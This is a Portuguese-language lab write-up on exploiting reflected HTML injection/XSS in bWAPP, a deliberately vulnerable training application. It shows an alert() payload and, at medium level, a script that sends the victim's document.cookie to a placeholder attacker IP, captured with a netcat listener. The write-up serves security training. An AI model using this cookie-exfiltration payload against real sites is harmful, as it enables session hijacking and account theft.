# bWAPP - A1: Injection - HTML Injection - Reflected (GET)

Este write-up descreve a exploração da vulnerabilidade "HTML Injection - Reflected (GET)" nos níveis low e medium do bWAPP. Vamos utilizar dois payloads diferentes para demonstrar como um ataque de Cross-Site Scripting (XSS) pode ser executado e como os cookies podem ser capturados.

## Nível Low

### Exploração

1. **Payload**:
   ```html
   <script>alert('XSS');</script>
   ```
   Este payload cria um alerta no navegador, demonstrando a execução de um script JavaScript.

2. **Execução**:
   - Insira o payload diretamente no campo vulnerável ou na URL, se aplicável.
   - Quando a página é carregada ou o link é acessado, o script será executado, resultando em um alerta.

## Nível Medium

### Exploração

1. **Preparação**:
   - Inicie o `netcat` (nc) no seu servidor para capturar os cookies:
     ```bash
     nc -lvnp 8000
     ```
   - Substitua `SEU_IP_PUBLICO` pelo endereço IP do seu servidor no payload.

2. **Payload**:
   ```html
   <script>document.location='http://SEU_IP_PUBLICO:8000/?cookie=' + document.cookie;</script>
   ```
   Este script redireciona a requisição para o seu servidor, incluindo os cookies como parte da URL.

3. **URL Encoding**:
   - É necessário realizar o encode da URL para garantir que o script seja transmitido corretamente através da URL. Ferramentas online de URL encoding podem ser usadas para isso.

4. **Execução**:
   - Insira a URL codificada no campo vulnerável ou na URL.
   - Quando a página é carregada ou o link é acessado, o script será executado, enviando os cookies para o seu servidor.

5. **Captura de Cookies**:
   - No seu servidor, você verá os cookies capturados na saída do `netcat`.

### Nota Importante

Os payloads para os níveis low e medium são intercambiáveis, mas o nível de proteção do site pode requerer adaptações específicas. Este exemplo é uma das várias maneiras de explorar a vulnerabilidade.

## Considerações de Segurança

- Este write-up é para fins educacionais em um ambiente controlado e com permissão.
- Nunca utilize estas técnicas em websites ou sistemas sem autorização explícita.
- A compreensão destas vulnerabilidades é crucial para desenvolver aplicações mais seguras.
